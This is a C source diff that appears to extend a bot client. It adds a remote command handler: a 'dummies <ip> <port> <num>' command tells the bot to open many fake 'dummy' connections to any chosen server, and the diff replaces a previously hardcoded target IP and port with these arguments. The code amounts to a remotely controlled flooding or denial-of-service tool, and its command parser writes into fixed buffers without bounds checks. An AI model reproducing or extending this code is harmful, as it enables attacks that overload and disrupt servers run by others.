@@ -195,7 +195,7 @@ void Debug(unsigned char *buffer, int buffersize)
 	printf("\n");
 }
 
-void ConnectDummies(int Amount)
+void ConnectDummies(const char *IP, int Port, int Amount)
 {
 	AmountofDummies = Amount; // for tick (keep alive)
 
@@ -218,8 +218,8 @@ void ConnectDummies(int Amount)
 
 	m_FromPort = htons(1111);
 
-	m_ToIP = inet_addr("92.222.64.188");
-	m_ToPort = htons(8707);
+	m_ToIP = inet_addr(IP);
+	m_ToPort = htons(Port);
 
 	//char message[256];  -- it was for chat ^^
 	unsigned char buffer[2048];
@@ -303,8 +303,43 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 		
 		if(recv(g_Client, buffer, sizeof(buffer), 0) != SOCKET_ERROR)
 		{
-			printf("Received: %s\n",buffer);
-			send(g_Client, "Command received", strlen("Command received"), 0);
+			char aCmd[512][256] = {{0}};
+			ZeroMemory(&aCmd, sizeof(aCmd));
+			int Cmd = 0;
+			int Char = 0;
+
+			for(int i = 0; i < strlen(buffer); i++)
+			{
+				if(buffer[i] == ' ')
+				{
+					Cmd++;
+					Char = 0;
+					continue;
+				}
+
+				aCmd[Cmd][Char] = buffer[i];
+				Char++;
+			}
+
+			if(strstr(aCmd[0], "status")) // test
+			{
+				send(g_Client, "Working fine", strlen("Working fine"), 0);
+			}
+			else if(strstr(aCmd[0], "dummies"))
+			{
+				if(aCmd[1][0] && aCmd[2][0] && aCmd[3][0])
+				{
+					int Port = atoi(aCmd[2]);
+					int Num = atoi(aCmd[3]);
+					ConnectDummies(aCmd[1], Port, Num);
+
+					send(g_Client, "Dummies connected", strlen("Dummies connected"), 0);
+				}
+				else
+					send(g_Client, "Please use: dummies <ip> <port> <num>", strlen("Please use: dummies <ip> <port> <num>"), 0);
+			}
+			else
+				send(g_Client, "We don't know this cmd. Try again.", strlen("We don't know this cmd. Try again."), 0);
 		}
 	}
 }
